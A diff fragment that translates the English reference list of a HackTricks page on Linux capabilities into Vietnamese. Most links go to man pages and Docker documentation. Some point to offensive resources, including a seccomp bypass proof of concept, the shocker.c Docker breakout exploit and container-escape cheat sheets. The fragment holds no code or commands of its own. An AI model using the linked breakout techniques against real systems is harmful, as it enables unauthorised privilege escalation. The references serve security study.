+- [2] [Hacker's Grimoire - Leo thang đặc quyền trên Linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
+- [3] [Kiến thức cơ bản về Linux Container: Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
 - [4] [Linux capabilities 101](https://linux-audit.com/linux-capabilities-101/)
-- [5] [Taking Advantage of Linux Capabilities](https://www.linuxjournal.com/article/5737)
-- [6] [Excessive Capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
-- [7] [Abusing access to mount namespaces through /proc/pid/root](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
-- [8] [Linux Capabilities: Why They Exist and How They Work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
-- [9] [Understanding Capabilities in Linux](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
-- [10] [PoC for bypassing seccomp if ptrace is allowed](https://gist.github.com/thejh/8346f47e359adecd1d53)
-- [11] [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
-- [12] [shocker.c - original CAP_DAC_READ_SEARCH Docker breakout exploit by Sebastian Krahmer](http://stealth.openwall.net/xSports/shocker.c)
-- [13] [Docker breakout exploit analysis](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
-- [14] [capabilities(7) - Linux manual page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
-- [15] [proc_pid_status(5) - Linux manual page](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
-- [16] [pam_cap(8) - Linux manual page](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
-- [17] [capability.conf(5) - Ubuntu Manpage](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
-- [18] [systemd.exec(5) - Linux manual page](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
-- [19] [Running containers - Docker Docs](https://docs.docker.com/engine/containers/run/)
-- [20] [docker container run - Docker Docs](https://docs.docker.com/reference/cli/docker/container/run)
-- [21] [cap_text_formats(7) - Linux manual page](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
-- [22] [getpcaps(8) - Linux manual page](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
-- [23] [getcap(8) - Linux manual page](https://man7.org/linux/man-pages/man8/getcap.8.html)
+- [5] [Tận dụng Linux Capabilities](https://www.linuxjournal.com/article/5737)
+- [6] [Capabilities quá mức](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
+- [7] [Lạm dụng quyền truy cập vào mount namespace thông qua /proc/pid/root](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
+- [8] [Linux Capabilities: Lý do tồn tại và cách hoạt động](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
+- [9] [Tìm hiểu về Capabilities trong Linux](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
+- [10] [PoC vượt qua seccomp nếu ptrace được cho phép](https://gist.github.com/thejh/8346f47e359adecd1d53)
+- [11] [Cách thoát khỏi nhiều giải pháp chroot khác nhau](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
+- [12] [shocker.c - exploit Docker breakout CAP_DAC_READ_SEARCH nguyên bản của Sebastian Krahmer](http://stealth.openwall.net/xSports/shocker.c)
+- [13] [Phân tích exploit Docker breakout](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
+- [14] [capabilities(7) - Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
+- [15] [proc_pid_status(5) - Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
+- [16] [pam_cap(8) - Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
+- [17] [capability.conf(5) - Trang hướng dẫn Ubuntu](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
+- [18] [systemd.exec(5) - Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
+- [19] [Chạy container - Tài liệu Docker](https://docs.docker.com/engine/containers/run/)
+- [20] [docker container run - Tài liệu Docker](https://docs.docker.com/reference/cli/docker/container/run)
+- [21] [cap_text_formats(7) - Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
+- [22] [getpcaps(8) - Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
+- [23] [getcap(8) - Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
 - [24] [amicontained](https://github.com/genuinetools/amicontained)
-- [25] [setcap(8) - Linux manual page](https://man7.org/linux/man-pages/man8/setcap.8.html)
-- [26] [capsh(1) - Linux manual page](https://man7.org/linux/man-pages/man1/capsh.1.html)
-- [27] [ioctl_iflags(2) - Linux manual page](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
-
+- [25] [setcap(8) - Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man8/setcap.8.html)
+- [26] [capsh(1) - Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man1/capsh.1.html)
+- [27] [ioctl_iflags(2) - Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
 {{#include ../../banners/hacktricks-training.md}}
